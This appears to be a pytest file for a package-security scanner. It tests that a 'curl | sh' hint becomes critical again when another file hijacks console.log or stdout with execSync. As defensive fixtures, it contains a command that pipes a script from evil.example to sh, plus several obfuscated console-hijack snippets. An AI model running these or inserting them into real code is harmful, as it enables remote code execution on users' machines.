"""A printed install hint lowered per file is re-checked with the whole package in view.

The per-file pass (``_scan_content``) sees one file, so it lowered
``console.log("curl … | sh")`` even when another file of the same package had replaced
``console.log`` with a runner; package calibration only looked at critical / high /
medium findings and never saw it again. In an artifact scan the lowered finding now
carries what it would have been and ``calibrate_package_findings`` restores that unless
the package-wide check also holds. ``const c = console`` (console read as a value, then
written through) and a replaced ``process.stdout.write`` also count as console
replacements now.
"""
from __future__ import annotations

import pytest

from src.scanner.artifact_fetch import ArtifactFetchResult, _make_file
from src.scanner.scan import ScanResult, _calculate_trust_score, _scan_content, apply_artifact_scan

RULE = "curl/wget piped to shell"
CMD = "curl -fsSL https://evil.example/x.sh | sh"


def _pkg(files: dict[str, str]) -> ScanResult:
    files = {"package.json": '{"name":"p","main":"index.js"}', **files}
    fetched = ArtifactFetchResult(
        ecosystem="npm", name="p", version="1", kind="tarball", ok=True,
        files={p: _make_file(p, t.encode()) for p, t in files.items()})
    r = ScanResult(repo="npm:p", stars=0, description="", framework="")
    apply_artifact_scan(r, "npm", fetched)
    r.trust_score = _calculate_trust_score(r)
    return r


def _sev(r: ScanResult, path: str = "index.js") -> set[str]:
    return {f.severity for f in r.findings if f.name == RULE and f.file_path == path}


INDEX = f"require('./setup');\nconsole.log({CMD!r});\n"
CP = "const cp = require('child_process');\n"


@pytest.mark.parametrize("setup", [
    CP + "console.log = (s) => cp.execSync(s);\n",
    CP + "const run = (s) => cp.execSync(s)\nconsole.log =\n  run\n",
    CP + "Object.assign(console, { log: (s) => cp.execSync(s) });\n",
    CP + "console['lo' + 'g'] = (s) => cp.execSync(s);\n",
    CP + "globalThis.console = { log: (s) => cp.execSync(s) };\n",
    CP + "Reflect.set(console, 'log', (s) => cp.execSync(s));\n",
    CP + "const c = console;\nc.log = (s) => cp.execSync(s);\n",
    CP + "const o = { c: console };\no.c.log = (s) => cp.execSync(s);\n",
    CP + "function f() { return console }\nf().log = (s) => cp.execSync(s);\n",
    CP + "process.stdout.write = (chunk) => cp.execSync(String(chunk));\n",
    "const PRELUDE = \"console.log = (s) => require('child_process').execSync(s)\";\n"
    "function load(src) { return (0, eval)(src); }\nload(PRELUDE);\n",
])
def test_console_replaced_in_another_file_restores_critical(setup):
    # Per file the hint alone looks printed ...
    f, _p, _s = _scan_content(INDEX, "index.js")
    assert {x.severity for x in f if x.name == RULE} == {"low"}
    # ... but the package replaces console / stdout: back to critical.
    r = _pkg({"setup.js": setup, "index.js": INDEX})
    assert _sev(r) == {"critical"}, [(x.severity, x.remediation) for x in r.findings
                                     if x.name == RULE]


def test_stdout_write_hint_with_replaced_stdout_restores_critical():
    r = _pkg({"setup.js": CP + "process.stdout.write = (c) => cp.execSync(String(c));\n",
              "index.js": f"require('./setup');\nprocess.stdout.write({CMD!r});\n"})
    assert _sev(r) == {"critical"}


def test_console_alias_in_the_same_file_stays_critical_per_file():
    src = (CP + "const c = console;\nc.log = (s) => cp.execSync(s);\n"
           f"console.log({CMD!r});\n")
    f, _p, _s = _scan_content(src, "index.js")
    assert {x.severity for x in f if x.name == RULE} == {"critical"}


@pytest.mark.parametrize("other", [
    "module.exports = { add: (a, b) => a + b };\n",
    "const x = 1;\nif (x === console) { }\n",
    "console.log('hello');\n",
])
def test_plain_printed_hint_stays_low_in_a_package(other):
    r = _pkg({"setup.js": other, "index.js": INDEX})
    assert _sev(r) == {"low"}


def test_restored_finding_drops_the_hint_note():
    r = _pkg({"setup.js": CP + "console.log = (s) => cp.execSync(s);\n", "index.js": INDEX})
    (f,) = [x for x in r.findings if x.name == RULE and x.file_path == "index.js"]
    assert f.severity == "critical" and not f.remediation


def test_pre_hint_is_not_a_serialized_field():
    import dataclasses
    f, _p, _s = _scan_content(INDEX, "index.js")
    (hint,) = [x for x in f if x.name == RULE]
    assert getattr(hint, "pre_hint", None) is not None
    assert "pre_hint" not in dataclasses.asdict(hint)
